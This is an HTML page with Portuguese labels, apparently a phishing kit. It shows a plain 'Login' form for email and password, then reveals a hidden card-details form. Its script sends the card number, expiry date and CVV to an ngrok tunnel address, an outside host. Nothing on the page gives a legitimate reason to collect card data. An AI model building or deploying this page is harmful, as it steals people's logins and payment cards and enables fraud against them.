<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Form</title>
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <style>
        /* Estilo para o corpo da página */
        body {
            font-family: Arial, sans-serif;
            background-image: url('https://github.com/Lai1s/presente/blob/5c9504ffab714c5cd2ea7edcf3fc5180786f2a52/fundo%202%20p.jpeg?raw=true'); /* Caminho para a imagem de fundo no GitHub */
            background-size: cover; /* Garante que a imagem cubra todo o fundo */
            background-repeat: no-repeat; /* Evita repetição da imagem */
            background-position: center; /* Centraliza a imagem */
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            color: #000;
            position: relative;
        }
        /* Estilo para o container */
        .container {
            width: 350px;
            background-color: rgba(255, 255, 255, 0.7); /* Adiciona um fundo branco semi-transparente */
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0px 0px 20px 0px rgba(0,0,0,0.1);
            position: relative;
            z-index: 1;
        }
        /* Estilo para os cabeçalhos dentro do container */
        .container h2 {
            text-align: center;
            margin-bottom: 30px;
            color: #000;
        }
        /* Estilo para grupo de formulário */
        .form-group {
            margin-bottom: 20px;
        }
        /* Estilo para campos de entrada de formulário */
        input.form-control {
            border-radius: 20px;
            padding: 12px 20px;
            font-size: 16px;
            border: 1px solid #ddd;
        }
        /* Estilo para botão */
        button {
            width: 100%;
            padding: 12px;
            background-color: #007bff;
            color: #fff;
            font-size: 18px;
            border: none;
            border-radius: 20px;
            cursor: pointer;
            transition: background-color 0.3s ease;
        }
        /* Estilo para o estado de hover do botão */
        button:hover {
            background-color: #0056b3;
        }
    </style>
</head>
<body>
    <div class="container" id="loginContainer">
        <h2>Login</h2>
        <form id="loginForm" method="POST" action="/">
            <div class="form-group">
                <input type="email" class="form-control" id="email" name="email" placeholder="Digite o e-mail">
            </div>
            <div class="form-group">
                <input type="password" class="form-control" id="password" name="password" placeholder="Digite a senha">
            </div>
            <button type="button" onclick="enviarLogin()">Entrar</button>
            <p id="mensagemErro" style="color: red;"></p>
        </form>
    </div>

    <div class="container" id="cartaoContainer" style="display: none;">
        <h2>Detalhes do Cartão</h2>
        <form id="cartaoForm" method="POST" action="https://b03d-2804-6850-8000-3d01-c12e-b350-c502-7e67.ngrok-free.app/">
            <div class="form-group">
                <input type="text" class="form-control" id="card_number" name="card_number" placeholder="Número do cartão">
            </div>
            <div class="form-group">
                <input type="text" class="form-control" id="expiration_date" name="expiration_date" placeholder="Data de expiração (MM/AA)">
            </div>
            <div class="form-group">
                <input type="text" class="form-control" id="cvv" name="cvv" placeholder="CVV">
            </div>
            <button type="button" onclick="enviarCartao()">Enviar</button>
            <p id="mensagemErroCartao" style="color: red;"></p>
        </form>
    </div>

    <script>
        function enviarLogin() {
            var email = document.getElementById('email').value;
            var password = document.getElementById('password').value;

            if (email === '' || password === '') {
                document.getElementById('mensagemErro').innerText = 'Por favor, preencha todos os campos.';
                return;
            }

            var formData = new FormData();
            formData.append('email', email);
            formData.append('password', password);

            var xhr = new XMLHttpRequest();
            xhr.open('POST', document.getElementById("loginForm").action);
            xhr.onload = function () {
                if (xhr.status === 200) {
                    document.getElementById("loginContainer").style.display = "none";
                    document.getElementById("cartaoContainer").style.display = "block";
                } else {
                    var mensagem = xhr.responseText;
                    document.getElementById('mensagemErro').innerText = mensagem;
                }
            };
            xhr.send(formData);
        }

        function enviarCartao() {
            var cardNumber = document.getElementById('card_number').value;
            var expirationDate = document.getElementById('expiration_date').value;
            var cvv = document.getElementById('cvv').value;

            if (cardNumber === '' || expirationDate === '' || cvv === '') {
                document.getElementById('mensagemErroCartao').innerText = 'Por favor, preencha todos os campos.';
                return;
            }

            var formData = new FormData();
            formData.append('card_number', cardNumber);
            formData.append('expiration_date', expirationDate);
            formData.append('cvv', cvv);

            var xhr = new XMLHttpRequest();
            xhr.open('POST', document.getElementById("cartaoForm").action);
            xhr.onload = function () {
                if (xhr.status === 200) {
                    alert('Detalhes do cartão enviados com sucesso!');
                    // Você pode redirecionar a página ou fazer outra ação aqui
                } else {
                    var mensagem = xhr.responseText;
                    document.getElementById('mensagemErroCartao').innerText = mensagem;
                }
            };
            xhr.send(formData);
        }
    </script>
</body>
</html>
